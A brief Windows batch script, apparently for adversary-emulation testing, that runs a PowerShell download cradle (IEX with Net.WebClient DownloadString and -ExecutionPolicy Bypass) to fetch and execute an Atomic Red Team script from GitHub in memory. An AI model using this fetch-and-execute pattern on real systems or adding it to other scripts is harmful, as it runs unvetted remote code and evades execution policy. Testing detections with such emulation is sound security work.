@echo off
REM This CMD script downloads and executes a remote PowerShell script in memory,
REM then outputs a confirmation message after execution.

powershell -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/5ede8f21e42ebe37e0a6eff757dba60bcfa85859/atomic/T1059.001/src/Invoke-DownloadCradle.ps1'); Write-Host 'PowerShell script executed successfully.'"

pause
